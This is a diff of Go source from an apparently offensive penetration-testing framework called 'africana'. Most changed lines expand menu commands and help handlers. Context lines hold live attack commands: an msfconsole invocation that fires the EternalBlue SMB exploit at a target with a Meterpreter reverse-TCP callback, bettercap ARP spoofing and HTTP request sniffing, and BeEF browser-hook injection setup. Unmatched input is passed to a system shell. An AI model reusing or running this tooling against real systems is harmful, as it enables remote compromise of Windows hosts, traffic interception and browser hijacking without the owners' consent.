@@ -5,6 +5,7 @@ import(
     "fmt"
     "utils"
     "menus"
+    "banners"
     "bufio"
     "strings"
     "os/exec"
@@ -97,10 +98,52 @@ func SmbExploit(userTarget string) {
     for {
         fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit" + bcolors.BLUE + ")" + bcolors.ENDC)
         fmt.Printf(bcolors.BLUE + "\n╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-        fmt.Scan(&userInput)
-        switch userInput {
-        case "0":
+        scanner.Scan()
+        userInput := scanner.Text()
+        switch strings.ToLower(userInput) {
+        case "banner":
+            banners.Banner()
+        case "sleep":
+            utils.Sleep()
+        case "version":
+            banners.Version()
+        case "m", "menu":
+            menus.MenuThreeOne()
+        case "logs", "history":
+            subprocess.LogHistory()
+        case "o", "junks", "outputs":
+            utils.ListJunks()
+        case "? info", "info", "help info":
+            menus.HelpInfo()
+        case "00", "?", "h", "help":
+            menus.HelpInfoMenuZero()
+        case "e", "q", "exit", "quit":
+            os.Exit(0)
+        case "0", "b", "back":
             return
+        case "clear logs", "clear history":
+            subprocess.ClearHistory()
+        case "info set", "set", "help set":
+            menus.HelpInfoSet()
+        case "clear junks", "clear outputs":
+            subprocess.ClearHistory()
+        case "? use", "info use", "help use", "use":
+            menus.HelpInfoUse()
+        case "? run", "info run", "help run", "run":
+            menus.HelpInfoRun()
+        case "f", "use f", "use features", "features":
+            menus.HelpInfoFeatures()
+        case "? tips", "info tips", "help tips", "tips":
+            menus.HelpInfoTips()
+        case "? show", "info show", "help show", "show":
+            menus.HelpInfoShow()
+        case "info list", "help list", "use list", "list":
+            menus.HelpInfoList()
+        case "? start", "info start", "help start", "start":
+            menus.HelpInfoStart()
+
+        case "list all", "list modules", "show modules", "show all", "modules":
+            menus.HelpInfoExplScan()
         case "1":
             fmt.Println()
             subprocess.Popen(`ip address`)
@@ -119,12 +162,6 @@ func SmbExploit(userTarget string) {
                 userLport = "9999"
             }
             subprocess.Popen(`msfdb start; msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, userTarget, userLhost, userLport)
-        case "cls", "clear":
-            utils.ClearScreen()
-        case "99", "m", "M", "menu", "Menu", "MENU":
-            menus.MenuThreeOne()
-        case "00", "h", "H", "help", "Help", "HELP":
-            menus.HelpThree()
         default:
             utils.SystemShell(userInput)
         }
@@ -136,18 +173,56 @@ func PacketSniffer(userTarget string) {
     for {
         fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Sniffer" + bcolors.BLUE + ")" + bcolors.ENDC)
         fmt.Printf(bcolors.BLUE + "\n╰─🐽" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-        fmt.Scan(&userInput)
-        switch userInput {
-        case "0":
+        scanner.Scan()
+        userInput := scanner.Text()
+        switch strings.ToLower(userInput) {
+        case "banner":
+            banners.Banner()
+        case "sleep":
+            utils.Sleep()
+        case "version":
+            banners.Version()
+        case "m", "menu":
+            menus.MenuThreeTwo()
+        case "logs", "history":
+            subprocess.LogHistory()
+        case "o", "junks", "outputs":
+            utils.ListJunks()
+        case "? info", "info", "help info":
+            menus.HelpInfo()
+        case "00", "?", "h", "help":
+            menus.HelpInfoMenuZero()
+        case "e", "q", "exit", "quit":
+            os.Exit(0)
+        case "0", "b", "back":
             return
+        case "clear logs", "clear history":
+            subprocess.ClearHistory()
+        case "info set", "set", "help set":
+            menus.HelpInfoSet()
+        case "clear junks", "clear outputs":
+            subprocess.ClearHistory()
+        case "? use", "info use", "help use", "use":
+            menus.HelpInfoUse()
+        case "? run", "info run", "help run", "run":
+            menus.HelpInfoRun()
+        case "f", "use f", "use features", "features":
+            menus.HelpInfoFeatures()
+        case "? tips", "info tips", "help tips", "tips":
+            menus.HelpInfoTips()
+        case "? show", "info show", "help show", "show":
+            menus.HelpInfoShow()
+        case "info list", "help list", "use list", "list":
+            menus.HelpInfoList()
+        case "? start", "info start", "help start", "start":
+            menus.HelpInfoStart()
+
+        case "list all", "list modules", "show modules", "show all", "modules":
+            menus.HelpInfoPsniffer()
         case "1":
             subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'`, userTarget)
         case "2":
             subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on'`)
-        case "99", "m", "M", "menu", "Menu", "MENU":
-            menus.MenuThreeTwo()
-        case "00", "h", "H", "help", "Help", "HELP":
-            menus.HelpThree()
         default:
             utils.SystemShell(userInput)
         }
@@ -203,10 +278,52 @@ func BeefEttercap(userTarget string) {
     menus.MenuThreeFour()
     fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap" + bcolors.BLUE + ")" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    scanner.Scan()
     userInput := scanner.Text()
     switch strings.ToLower(userInput) {
-    case "0":
+    case "banner":
+            banners.Banner()
+    case "sleep":
+        utils.Sleep()
+    case "version":
+        banners.Version()
+    case "m", "menu":
+       menus.MenuThreeFour()
+    case "logs", "history":
+        subprocess.LogHistory()
+    case "o", "junks", "outputs":
+        utils.ListJunks()
+    case "? info", "info", "help info":
+        menus.HelpInfo()
+    case "00", "?", "h", "help":
+        menus.HelpInfoMenuZero()
+    case "e", "q", "exit", "quit":
+        os.Exit(0)
+    case "0", "b", "back":
         return
+    case "clear logs", "clear history":
+        subprocess.ClearHistory()
+    case "info set", "set", "help set":
+        menus.HelpInfoSet()
+    case "clear junks", "clear outputs":
+        subprocess.ClearHistory()
+    case "? use", "info use", "help use", "use":
+        menus.HelpInfoUse()
+    case "? run", "info run", "help run", "run":
+        menus.HelpInfoRun()
+    case "f", "use f", "use features", "features":
+        menus.HelpInfoFeatures()
+    case "? tips", "info tips", "help tips", "tips":
+        menus.HelpInfoTips()
+    case "? show", "info show", "help show", "show":
+        menus.HelpInfoShow()
+    case "info list", "help list", "use list", "list":
+        menus.HelpInfoList()
+    case "? start", "info start", "help start", "start":
+        menus.HelpInfoStart()
+
+    case "list all", "list modules", "show modules", "show all", "modules":
+        menus.HelpInfoBeefNinja()
     case "1":
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
@@ -415,8 +532,49 @@ func BeefBettercap(userTarget string) {
     fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     userInput := scanner.Text()
     switch strings.ToLower(userInput) {
-    case "0":
+    case "banner":
+        banners.Banner()
+    case "sleep":
+        utils.Sleep()
+    case "version":
+        banners.Version()
+    case "m", "menu":
+        menus.MenuThreeFour()
+    case "logs", "history":
+        subprocess.LogHistory()
+    case "o", "junks", "outputs":
+        utils.ListJunks()
+    case "? info", "info", "help info":
+        menus.HelpInfo()
+    case "00", "?", "h", "help":
+        menus.HelpInfoMenuZero()
+    case "e", "q", "exit", "quit":
+        os.Exit(0)
+    case "0", "b", "back":
         return
+    case "clear logs", "clear history":
+        subprocess.ClearHistory()
+    case "info set", "set", "help set":
+        menus.HelpInfoSet()
+    case "clear junks", "clear outputs":
+        subprocess.ClearHistory()
+    case "? use", "info use", "help use", "use":
+        menus.HelpInfoUse()
+    case "? run", "info run", "help run", "run":
+        menus.HelpInfoRun()
+    case "f", "use f", "use features", "features":
+        menus.HelpInfoFeatures()
+    case "? tips", "info tips", "help tips", "tips":
+        menus.HelpInfoTips()
+    case "? show", "info show", "help show", "show":
+        menus.HelpInfoShow()
+    case "info list", "help list", "use list", "list":
+        menus.HelpInfoList()
+    case "? start", "info start", "help start", "start":
+        menus.HelpInfoStart()
+
+    case "list all", "list modules", "show modules", "show all", "modules":
+        menus.HelpInfoBeefNinja()
     case "1":
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
@@ -552,8 +710,8 @@ func BeefBettercap(userTarget string) {
 }
 
 func BeefInjector(userTarget string) {
+    menus.MenuThreeThree()
     for {
-        menus.MenuThreeThree()
         fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefInject " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Ettercap" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
         fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         scanner.Scan()
@@ -561,9 +719,50 @@ func BeefInjector(userTarget string) {
         if userInput == "" {
             userInput = "1"
          }
-        switch userInput {
-        case "0":
+        switch strings.ToLower(userInput) {
+        case "banner":
+            banners.Banner()
+        case "sleep":
+            utils.Sleep()
+        case "version":
+            banners.Version()
+        case "m", "menu":
+            menus.MenuThreeThree()
+        case "logs", "history":
+            subprocess.LogHistory()
+        case "o", "junks", "outputs":
+            utils.ListJunks()
+        case "? info", "info", "help info":
+            menus.HelpInfo()
+        case "00", "?", "h", "help":
+            menus.HelpInfoMenuZero()
+        case "e", "q", "exit", "quit":
+            os.Exit(0)
+        case "0", "b", "back":
             return
+        case "clear logs", "clear history":
+            subprocess.ClearHistory()
+        case "info set", "set", "help set":
+            menus.HelpInfoSet()
+        case "clear junks", "clear outputs":
+            subprocess.ClearHistory()
+        case "? use", "info use", "help use", "use":
+            menus.HelpInfoUse()
+        case "? run", "info run", "help run", "run":
+            menus.HelpInfoRun()
+        case "f", "use f", "use features", "features":
+            menus.HelpInfoFeatures()
+        case "? tips", "info tips", "help tips", "tips":
+            menus.HelpInfoTips()
+        case "? show", "info show", "help show", "show":
+            menus.HelpInfoShow()
+        case "info list", "help list", "use list", "list":
+            menus.HelpInfoList()
+        case "? start", "info start", "help start", "start":
+            menus.HelpInfoStart()
+
+        case "list all", "list modules", "show modules", "show all", "modules":
+            menus.HelpInfoBeefNinja()
         case "1":
             BeefEttercap(userTarget)
         case "2":
